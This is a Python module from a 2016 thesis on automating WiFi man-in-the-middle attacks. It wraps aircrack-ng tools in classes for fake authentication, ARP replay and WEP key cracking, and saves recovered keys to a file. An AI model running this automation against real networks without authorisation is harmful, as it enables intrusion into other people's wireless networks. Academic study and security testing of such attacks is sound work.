#!/usr/bin/env python3
"""
WEP cracking

Automatization of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import logging
import os
import subprocess
import time

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'


class FakeAuthentication(object):
    """
    The  fake authentication attack allows you to perform the two types of WEP authentication (Open System and
    Shared Key) plus associate with the access point (AP). This is only useful when you need  an associated  MAC
    address in various aireplay-ng attacks and there is currently no associated client.
    It should be noted that the fake authentication attack does NOT generate any ARP packets.
    Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

    `fake_authentication[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=fake_authentication>`_
    """

    def __init__(self, interface, ap, attacker_mac):
        self.interface = interface
        self.ap = ap
        self.attacker_mac = attacker_mac

        self.process = None

    def start(self, reassoc_delay=30, keep_alive_delay=5):
        """
        :param reassoc_delay: reassociation timing in seconds
        :param keep_alive_delay: time between keep-alive packets
        """
        cmd = ['aireplay-ng',
               '--fakeauth', str(reassoc_delay),
               '-q', str(keep_alive_delay),
               '-a', self.ap.bssid,
               '-h', self.attacker_mac,
               self.interface]
        self.process = subprocess.Popen(cmd)
        logging.debug('FakeAuthentication started')

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('FakeAuthentication killed')

            self.process = None
            return exitcode


class ArpReplay(object):
    """
    The classic ARP request replay attack is the most effective way to generate new initialization vectors  (IVs),
    and works very reliably. The program listens for an ARP packet then retransmits it back to the access point.
    This, in turn,  causes  the  access point  to  repeat  the  ARP  packet  with  a new IV. The program retransmits
    the same ARP packet over and over. However, each ARP packet  repeated  by  the  access point has a new IVs.
    It is all these new IVs which allow you to determine the WEP key.

    `arp-request_reinjection[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection>`_
    """

    def __init__(self, interface, ap, attacker_mac):
        self.interface = interface
        self.ap = ap
        self.attacker_mac = attacker_mac

        self.process = None

    def start(self):
        cmd = ['aireplay-ng',
               '--arpreplay',
               '-b', self.ap.bssid,  # MAC address of access point.
               '-h', self.attacker_mac,
               self.interface]
        self.process = subprocess.Popen(cmd)
        logging.debug('ArpReplay started')

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('ArpReplay killed')

            self.process = None
            return exitcode


class WepCracker(object):
    """
    Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
    of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW
    approach (Pyshkin, Tews, Weinmann). The default cracking method is PTW. This is done in two phases. In the first
    phase, aircrack-ng only uses ARP packets. If the key is not found, then it uses all the packets in the capture.
    Please remember that not all packets can be used for the PTW method. This Tutorial: Packets Supported for the PTW
    Attack page provides details. An important limitation is that the PTW attack currently can only crack 40 and 104 bit
    WEP keys. The main advantage of the PTW approach is that very few data packets are required to crack the WEP key.
    The second method is the FMS/KoreK method. The FMS/KoreK method incorporates various statistical attacks
    to discover the WEP key and uses these in combination with brute forcing.

    `aircrack-ng[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=aircrack-ng>`_
    """

    # TODO (xvondr20) store key file in temp dir?

    def __init__(self, cap_filepath, ap):
        self.cap_filepath = cap_filepath
        self.ap = ap

        self.process = None

    def start(self):
        cmd = ['aircrack-ng',
               '-a', '1',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-l', self.ap.bssid + '_wepkey.hex',  # Write the key into a file.
               self.cap_filepath]
        self.process = subprocess.Popen(cmd)
        logging.debug('WepCracker started')

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('WepCracker killed')

            self.process = None
            return exitcode

    def has_key(self):
        return os.path.isfile(self.ap.bssid + '_wepkey.hex')
